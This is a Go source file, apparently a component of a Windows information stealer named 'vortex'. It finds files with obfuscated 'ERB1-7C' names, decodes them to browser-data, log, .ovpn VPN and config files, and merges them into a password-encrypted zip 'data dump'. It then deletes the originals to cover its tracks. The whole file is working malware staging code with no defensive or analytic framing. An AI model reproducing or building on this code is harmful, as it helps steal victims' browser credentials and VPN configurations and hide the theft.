//go:build windows

package hutil

import (
	"io"
	"os"
	"path/filepath"
	"strings"
	"vortex/encrypt"

	"github.com/alexmullins/zip"
)

// Combine all browser data into one file
func mergeBrowserData(mainFolder string, dataFile string, outputFile string) error {
	var (
		destFile *os.File
		err      error
	)
	if _, err = os.Stat(filepath.Join(mainFolder, outputFile)); os.IsNotExist(err) {
		destFile, err = os.Create(filepath.Join(mainFolder, outputFile))
		if err != nil {
			return err
		}
		defer destFile.Close()
	} else {

		destFile, err = os.OpenFile(filepath.Join(mainFolder, outputFile), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			return err
		}
		defer destFile.Close()
	}

	dataSourceFile, err := os.Open(filepath.Join(mainFolder, dataFile))
	if err != nil {
		return nil
	}
	defer dataSourceFile.Close()

	if _, err = io.Copy(destFile, dataSourceFile); err != nil {
		return err
	}

	return nil
}

func archiveDataFiles(w *zip.Writer, fileName string, folderPath string, pass string) error {

	file, err := os.Open(filepath.Join(folderPath, fileName))
	if err != nil {
		return err
	}
	defer file.Close()

	encArchivedFile, err := w.Encrypt(filepath.Base(file.Name()), pass)
	if err != nil {
		return err
	}

	if _, err = io.Copy(encArchivedFile, file); err != nil {
		return err
	}

	return nil
}

func CompressDataFiles(mainFolder string, finalDataDump string, pass string) error {
	zipFileName := filepath.Join(mainFolder, finalDataDump)
	archive, err := os.Create(zipFileName)
	if err != nil {
		return err
	}
	defer archive.Close()

	zipWriter := zip.NewWriter(archive)
	defer zipWriter.Close()

	files, err := os.ReadDir(mainFolder)
	if err != nil {
		return err
	}
	for _, f := range files {
		if strings.HasPrefix(f.Name(), "ERB1-7C") {
			decryptedFileName := encrypt.B64Util(f.Name(), 1)
			if strings.HasSuffix(decryptedFileName, ".txt") || strings.HasSuffix(decryptedFileName, ".log") || strings.HasSuffix(decryptedFileName, ".ovpn") || strings.HasSuffix(decryptedFileName, ".config") || strings.HasSuffix(decryptedFileName, ".zip") {
				mergeBrowserData(mainFolder, f.Name(), decryptedFileName)
				if err = archiveDataFiles(zipWriter, decryptedFileName, mainFolder, pass); err != nil {
					return err
				}
				if err = os.Remove(filepath.Join(mainFolder, f.Name())); err != nil {
					return err
				}
				if err = os.Remove(filepath.Join(mainFolder, decryptedFileName)); err != nil {
					return err
				}
			}
		}
	}

	return nil
}
